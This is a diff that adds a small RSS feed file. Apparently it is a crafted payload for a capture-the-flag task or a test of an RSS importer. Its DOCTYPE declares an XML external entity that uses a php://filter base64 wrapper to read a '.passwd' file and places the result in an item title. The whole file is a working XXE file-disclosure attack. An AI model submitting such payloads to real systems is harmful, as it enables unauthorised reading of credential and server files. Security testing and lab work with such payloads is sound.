@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+    <!ELEMENT title ANY>
+    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=.passwd" >
+]>
+<rss version="1.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Блог</title>
+        <link>https://ixbt.games/</link>
+        <description>Здесь говорят об играх</description>
+        <lastBuildDate>Thr, 20 11 2024 00:00:00 -0000</lastBuildDate>
+        <item>
+            <title>&xxe;</title>
+            <link>http://bibarsest.com</link>
+            <description>post</description>
+            <author>bibarsest@example.com</author>
+            <pubDate>Thr, 20 11 2024 00:00:00 -0000</pubDate>
+        </item>
+    </channel>
+</rss>
